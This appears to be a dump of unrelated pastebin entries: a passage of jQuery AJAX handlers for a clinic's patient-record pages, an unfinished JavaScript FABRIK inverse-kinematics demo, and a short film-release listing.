    $('#NotifikasiEditPasien').html('<div class=""spinner-border text-secondary"" role=""status""><span class=""sr-only""></span></div>');
    var form = $('#ProsesEditPasien')[0];
    var data = new FormData(form);
    $.ajax({
        type 	    : 'POST',
        url 	    : '_Page/Pasien/ProsesEditPasien.php',
        data 	    :  data,
        cache       : false,
        processData : false,
        contentType : false,
        enctype     : 'multipart/form-data',
        success     : function(data){
            $('#NotifikasiEditPasien').html(data);
            var NotifikasiEditPasienBerhasil=$('#NotifikasiEditPasienBerhasil').html();
            if(NotifikasiEditPasienBerhasil==""Success""){
                //Menutup Modal
                $('#ModalEditPasien').modal('hide');
                //Reset Form Edit
                $('#ProsesEditPasien')[0].reset();
                //Menampilkan Data
                var ProsesBatas = $('#ProsesBatas').serialize();
                $.ajax({
                    type 	    : 'POST',
                    url 	    : '_Page/Pasien/TabelPasien.php',
                    data 	    :  ProsesBatas,
                    success     : function(data){
                        $('#MenampilkanTabelPasien').html(data);
                    }
                });
                //Menampilkan Swal
                swal(""Berhasil!"", ""Edit Pasien Berhasil"", ""success"");
            }
        }
    });
});
//Modal Hapus Pasien
$('#ModalHapusPasien').on('show.bs.modal', function (e) {
    var id_pasien = $(e.relatedTarget).data('id');
    $('#PutIdPasien').val(id_pasien);
    $('#NotifikasiHapusPasien').html('<small><code class=""text-primary"">Apakah anda yakin akan menghapus data ini?</code></small>');
});
//Ketika Proses Submit Hapus Pasien
$('#ProsesHapusPasien').submit(function(){
    $('#NotifikasiHapusPasien').html('<div class=""spinner-border text-secondary"" role=""status""><span class=""sr-only""></span></div>');
    var form = $('#ProsesHapusPasien')[0];
    var data = new FormData(form);
    $.ajax({
        type 	    : 'POST',
        url 	    : '_Page/Pasien/ProsesHapusPasien.php',
        data 	    :  data,
        cache       : false,
        processData : false,
        contentType : false,
        enctype     : 'multipart/form-data',
        success     : function(data){
            $('#NotifikasiHapusPasien').html(data);
            var NotifikasiHapusPasienBerhasil=$('#NotifikasiHapusPasienBerhasil').html();
            if(NotifikasiHapusPasienBerhasil==""Success""){
                //Menutup Modal
                $('#ModalHapusPasien').modal('hide');
                //Reset Form Hapus
                $('#ProsesHapusPasien')[0].reset();
                //Menampilkan Data
                var ProsesBatas = $('#ProsesBatas').serialize();
                $.ajax({
                    type 	    : 'POST',
                    url 	    : '_Page/Pasien/TabelPasien.php',
                    data 	    :  ProsesBatas,
                    success     : function(data){
                        $('#MenampilkanTabelPasien').html(data);
                    }
                });
                //Menampilkan Swal
                swal(""Berhasil!"", ""Hapus Pasien Berhasil"", ""success"");
            }
        }
    });
});
//Modal Detail NIK
$('#ModalDetailNik').on('show.bs.modal', function (e) {
    var nik = $(e.relatedTarget).data('id');
    $('#FormDetailNik').html(""Loading..."");
    $.ajax({
        type 	    : 'POST',
        url 	    : '_Page/Pasien/FormDetailNik.php',
        data        : {nik: nik},
        success     : function(data){
            $('#FormDetailNik').html(data);
        }
    });
});
//Modal Detail BPJS
$('#ModalDetailBpjs').on('show.bs.modal', function (e) {
    var no_bpjs = $(e.relatedTarget).data('id');
    $('#FormDetailBpjs').html(""Loading..."");
    $.ajax({
        type 	    : 'POST',
        url 	    : '_Page/Pasien/FormDetailBpjs.php',
        data        : {no_bpjs: no_bpjs},
        success     : function(data){
            $('#FormDetailBpjs').html(data);
        }
    });
});"
svi1BW6k,FABRIK Inverse Kinematics,Mangus875,JavaScript,Tuesday 19th of December 2023 02:48:51 PM CDT,"// TODO: finish fixing desmosify function

function getType(obj) {
    if (obj === null) return 'null';
    if (obj === undefined) return 'undefined';
    return obj.__proto__.constructor.name;
}

function from(min) {
	let fromObj = [];
	fromObj.to = (max) => {
		let toObj = {};
		toObj.run = (statement) => {
			if (min > max) throw new RangeError(`loop start must be below loop max`)
			for (let i = min; i <= max; i++) {
				statement(i);
			}
		}
		return toObj;
	}
	return fromObj;
}

function desmosLerp(a,b) {
	if (getType(a) != getType(b)) throw new TypeError(`cannot lerp between a point and a number`);
	if (getType(a) == ""Vector2"") {
		a = a.toString(10000);
		// a.replace(""("", ""\\left("");
		// a.replace("")"", ""\\right)"");
		// a.replace("" "", """");
		b = b.toString(10000);
		// b.replace(""("", ""\\left("");
		// b.replace("")"", ""\\right)"");
		// b.replace("" "", """");
	}
	return `l_{erp}(t,${a},${b})`
}

function desmosify(points, lerp, name) {
	let result = name[0]+""_{""+name.substring(1)+""}=\\left["";
	
	for (let i = 0; i < points.length; i++) {
		let pt = points[i];
		if (i == points.length-1 && lerp) continue;
		if (lerp) {
			result += desmosLerp(points[i], points[i+1]);
			result += (i != points.length-2 ? ',' : '');
			continue;
		}
		result += pt.toString(10000);
		result += (i != points.length-1 ? ',' : '');
	}
	/*
	points.forEach((pt,i) => {
		if (lerp) {
			result += desmosLerp(pt
		}
		result += pt.toString(10000);
		result += (i != points.length-1 ? ',' : '');
	});
	*/
	result += ""\\right]"";
	// result.replaceAll(""("", ""\\left("");
	// result.replaceAll("")"", ""\\right)"");
	result.replaceAll("" "", """");
	return result;
}

function roundTo(n,p=1) {
	return Math.round(n*p)/p;
}

class Vector2 {
	constructor(x=0, y=0) {
		this.x = x;
		this.y = y;
	}
	
	static copy(v) {
		return new Vector2(v.x, v.y);
	}
	
	static add(v1, v2) {
		return new Vector2(v1.x+v2.x, v1.y+v2.y);
	}
	
	static sub(v1, v2) {
		return new Vector2(v1.x-v2.x, v1.y-v2.y);
	}
	
	add(v) {
		this.x += v.x;
		this.y += v.y;
		return this;
	}
	
	sub(v) {
		this.x -= v.x;
		this.y -= v.y;
		return this;
	}
	
	mult(s) {
		this.x *= s;
		this.y *= s;
		return this;
	}
	
	normalize() {
		this.mult(1/this.magnitude);
		return this;
	}
	
	get magnitude() {
		return Math.sqrt(this.x**2 + this.y**2);
	}
	
	set magnitude(mag) {
		this.normalize();
		this.mult(mag);
	}
	
	moveTo(v) {
		this.x = v.x;
		this.y = v.y;
	}
	
	toString(d=100) {
		return `(${roundTo(this.x, d)}, ${roundTo(this.y, d)})`;
	}
}

const rad = deg => deg*Math.PI / 180;
const deg = rad => 180*rad / Math.PI;

function polar(...pt) {
	let x,y;
	if (pt.length == 1) {
		x = pt[0].x;
		y = pt[0].y;
	} else {
		x = pt[0];
		y = pt[1];
	}
	let coord = [];
	coord.r = Math.sqrt(x*x + y*y);
	coord.theta = Math.atan(y,x);
	return coord;
}

function car(r,theta) {
	let x,y;
	x = r*Math.cos(theta);
	y = r*Math.sin(theta);
	return [x,y];
}

function getAngles(points, degrees=false) {
	let angs = [];
	for (let i = 0; i < points.length; i++) {
		let pt1 = points[i];
		let pt2 = points[i-1] || new Vector2();
		
		let angle = polar(Vector2.sub(pt1, pt2)).theta;
		if (degrees) angle = deg(angle.radians);
		
		angs.push(angle);
	}
	return angs;
}

function getLengths(points) {
	let lengths = [];
	for (let i = 0; i < points.length; i++) {
		let pt1 = points[i];
		let pt2 = points[i-1] || new Vector2();
		
		let dist = polar(Vector2.sub(pt1, pt2)).r;
		lengths.push(dist);
	}
	return lengths;
}

class arm {
	constructor(...points) {
		this.points = points;
		this.lengths = getLengths(this.points);
		this.angles = getAngles(this.points);
	}
	
	reach(target, iterations=1) {
		let origin = Vector2.copy(this.points[0]);
		for (let n = 0; n < iterations; n++) {
			this.points[this.points.length-1].moveTo(target);
			for (let i = this.points.length-2; i >= 0; i--) {
				this.points[i].moveTo(Vector2.sub(this.points[i],this.points[i+1]).normalize().mult(this.lengths[i+1]).add(this.points[i+1]));
			}
			this.points[0].moveTo(origin);
			for (let i = 1; i < this.points.length; i++) {
				this.points[i].moveTo(Vector2.sub(this.points[i],this.points[i-1]).normalize().mult(this.lengths[i]).add(this.points[i-1]));
			}
		}
		
		this.updateAngles();
	}
	
	updateAngles() {
		this.angles = getAngles(this.points);
	}
}

let segs = []
for (let i = 0; i < 30; i++) {
	segs.push(new Vector2(i, 0));
}
let ikArm = new arm(...segs);

for (let i = 0; i < 100; i++) {
	ikArm.reach(new Vector2(...car(Math.random()*ikArm.points.length, Math.random()*2*Math.PI)), 100);
}
console.group(""Kinematic Arm"");
ikArm.points.forEach(pt => {
	console.log(pt.toString(1000));
});
console.groupEnd();
console.log(desmosify(ikArm.points, false, ""Arm""));"
ukTNUtmR,Western.2017.Deu.720p.h264.aac.Subs-bp,bpmircea,BrainFuck,Tuesday 19th of December 2023 02:44:22 PM CDT,"Western (Western) (Valeska Grisebach, 2017)
aka
Western.2017.Deu.720p.h264.aac.Subs-bp
https://www.imdb.com/title/tt5157326/

Uploading..."
